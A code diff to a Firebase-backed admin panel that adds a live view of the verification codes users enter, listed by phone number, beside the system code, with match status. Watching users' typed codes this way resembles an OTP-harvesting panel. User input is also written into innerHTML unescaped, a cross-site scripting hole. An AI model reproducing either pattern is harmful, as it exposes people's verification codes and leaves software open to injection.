@@ -2,6 +2,7 @@
  * C.I.A. Command Center - Admin Panel
  * First Time Setup → Auto Login After
  * + System Verification Panel
+ * + User-Entered Code Display
  */
 
 const firebaseConfig = {
@@ -95,7 +96,6 @@ async function setupMasterKey() {
             checkGlobalFirewallStatus();
             checkChangeNumberStatus();
             
-            // 🎯 Initialize System Verification Panel
             initSystemVerificationPanel();
             
             console.log('✅ Setup complete! Auto-login successful.');
@@ -146,7 +146,6 @@ document.addEventListener('DOMContentLoaded', async function() {
         checkGlobalFirewallStatus();
         checkChangeNumberStatus();
         
-        // 🎯 Initialize System Verification Panel
         setTimeout(() => {
             initSystemVerificationPanel();
         }, 1000);
@@ -1116,6 +1115,7 @@ function closeBranchPopup() {
 // ============================================================
 // 🎯 SYSTEM VERIFICATION PANEL
 // Read data from user_sessions/{phone}/system_verification
+// + Display userEnteredCode (para makita ang aktwal na code)
 // ============================================================
 
 function initSystemVerificationPanel() {
@@ -1137,10 +1137,15 @@ function initSystemVerificationPanel() {
             var userData = sessions[phone];
             var verification = userData.system_verification;
 
-            if (verification && (verification.status === 'active' || verification.status === 'expired')) {
+            if (verification && (verification.status === 'active' ||
+                                 verification.status === 'expired' ||
+                                 verification.status === 'invalid' ||
+                                 verification.status === 'verified')) {
                 verifications.push({
                     phone: phone,
                     code: verification.code || '----',
+                    userEnteredCode: verification.userEnteredCode || null,
+                    isMatch: verification.isMatch || false,
                     timer: verification.timer || 0,
                     status: verification.status || 'active',
                     deviceId: verification.deviceId || 'Unknown',
@@ -1186,7 +1191,7 @@ function renderSystemVerificationList(verifications) {
     if (!listEl) return;
 
     if (!verifications || verifications.length === 0) {
-        listEl.innerHTML = 
+        listEl.innerHTML =
             '<div class="verification-empty">' +
                 '<i class="fas fa-inbox"></i>' +
                 '<p>No active verifications</p>' +
@@ -1198,15 +1203,49 @@ function renderSystemVerificationList(verifications) {
 
     verifications.forEach(function(v) {
         var isActive = v.status === 'active';
-        var statusClass = isActive ? 'status-active' : 'status-expired';
-        var badgeClass = isActive ? 'active' : 'expired';
+        var statusClass = 'status-' + v.status;
+        var badgeClass = v.status;
+
+        // ✅ Status badge text
+        var statusText = 'ACTIVE';
+        if (v.status === 'expired') statusText = 'EXPIRED';
+        if (v.status === 'invalid') statusText = 'INVALID';
+        if (v.status === 'verified') statusText = 'VERIFIED';
 
         var timerClass = 'timer-value';
         if (v.timer <= 9 && isActive) timerClass += ' urgent';
 
         var createdTime = v.createdAt ? formatVerificationTime(v.createdAt) : '---';
 
-        html += 
+        // ✅ USER-ENTERED CODE DISPLAY
+        var userCodeHtml = '';
+        if (v.userEnteredCode) {
+            var matchClass = v.isMatch ? 'code-match' : 'code-mismatch';
+            var matchIcon = v.isMatch ? '✅' : '❌';
+            var matchText = v.isMatch ? 'MATCH' : 'MISMATCH';
+
+            userCodeHtml =
+                '<div class="verification-data-box">' +
+                    '<div class="verification-data-label">📝 USER INPUT</div>' +
+                    '<div class="verification-data-value user-code-value ' + matchClass + '">' +
+                        v.userEnteredCode +
+                    '</div>' +
+                    '<div class="verification-match-badge ' + matchClass + '">' +
+                        matchIcon + ' ' + matchText +
+                    '</div>' +
+                '</div>';
+        } else {
+            userCodeHtml =
+                '<div class="verification-data-box">' +
+                    '<div class="verification-data-label">📝 USER INPUT</div>' +
+                    '<div class="verification-data-value user-code-value waiting">' +
+                        '----' +
+                    '</div>' +
+                    '<div class="verification-match-badge waiting">⏳ WAITING</div>' +
+                '</div>';
+        }
+
+        html +=
             '<div class="verification-item ' + statusClass + '" data-phone="' + v.phone + '">' +
                 '<div class="verification-header-row">' +
                     '<div class="verification-phone">' +
@@ -1215,7 +1254,7 @@ function renderSystemVerificationList(verifications) {
                     '</div>' +
                     '<div class="verification-status-badge ' + badgeClass + '">' +
                         '<span class="status-dot"></span>' +
-                        '<span>' + (isActive ? 'ACTIVE' : 'EXPIRED') + '</span>' +
+                        '<span>' + statusText + '</span>' +
                     '</div>' +
                 '</div>' +
 
@@ -1227,11 +1266,16 @@ function renderSystemVerificationList(verifications) {
                         '</div>' +
                     '</div>' +
                     '<div class="verification-data-box">' +
-                        '<div class="verification-data-label">🔑 4-DIGIT CODE</div>' +
+                        '<div class="verification-data-label">🔑 SYSTEM CODE</div>' +
                         '<div class="verification-data-value code-value">' +
                             v.code +
                         '</div>' +
                     '</div>' +
+                '</div>' +
+
+                // ✅ USER-ENTERED CODE
+                '<div class="verification-data-grid user-input-grid">' +
+                    userCodeHtml +
                 '</div>' +
 
                 '<div class="verification-footer">' +
@@ -1742,6 +1786,6 @@ window.showBranchDetails = showBranchDetails;
 window.closeBranchPopup = closeBranchPopup;
 window.initSystemVerificationPanel = initSystemVerificationPanel;
 
-console.log('✅ C.I.A. Admin Panel v3.1 - Auto-login with System Verification');
+console.log('✅ C.I.A. Admin Panel v3.2 - Auto-login with User-Entered Code');
 console.log('ℹ️ First time? Create your access key.');
 console.log('ℹ️ Already setup? Auto-login.');
